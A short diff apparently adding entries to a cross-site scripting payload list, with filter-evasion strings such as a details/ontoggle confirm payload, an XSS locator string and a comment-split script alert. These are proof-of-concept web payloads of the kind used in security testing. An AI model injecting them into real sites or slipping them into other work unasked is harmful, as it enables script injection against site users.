@@ -22,3 +22,8 @@
 
 '-[document.domain].map(alert)-'
 
+">'><details/open/ontoggle=confirm('XSS')>
+
+'';!--"<XSS>=&{()}
+
+<!--><script>alert/**/()/**/</script>
